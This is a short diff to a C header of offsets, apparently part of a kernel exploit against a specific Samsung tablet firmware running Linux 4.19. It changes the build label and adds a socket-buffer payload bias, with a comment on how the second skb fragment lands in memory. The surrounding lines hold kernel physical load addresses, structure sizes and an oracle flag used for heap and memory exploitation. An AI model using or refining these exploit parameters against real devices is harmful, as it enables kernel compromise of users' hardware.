@@ -1,7 +1,7 @@
 #ifndef OFFSET_H
 #define OFFSET_H
 #define BUILD_VARIANT_LABEL \
-  "gts7lwifi-T870XXS8DXH1-app-4.19-result-route-pi-order"
+  "gts7lwifi-T870XXS8DXH1-app-4.19-second-frag-layout"
 #define APP_PHYS_P0_ORACLE 1
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS 1
@@ -16,6 +16,12 @@
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80080000ULL
 #define SKB_DATA_DELTA (-0xe80LL)
+/*
+ * 4.19 splits the 64 KiB send into 0x8e80 and 0x7180 byte skbs. The second
+ * skb has a 0x180-byte linear head, so its order-3 fragment starts at source
+ * offset 0x9000 rather than the generic 0x8e80 placement.
+ */
+#define SKB_SECOND_PAYLOAD_BIAS 0x180
 
 #define MM_STRUCT_SZ 0x400
 #define MM_ORDER 3
